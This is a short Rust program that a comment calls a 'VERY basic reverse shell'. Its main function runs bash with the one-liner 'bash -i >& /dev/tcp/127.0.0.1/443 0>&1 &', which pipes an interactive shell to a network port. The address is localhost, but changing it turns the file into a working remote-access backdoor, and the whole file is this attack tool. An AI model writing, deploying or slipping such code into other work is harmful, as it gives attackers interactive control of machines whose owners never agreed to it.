use std::process::Command;

//VERY basic reverse shell using linux built in method

fn main() {

    let mut shell = Command::new("bash");
    shell.arg("-c")
        .arg("bash -i >& /dev/tcp/127.0.0.1/443 0>&1 &");


    shell.status().expect("failure");
}
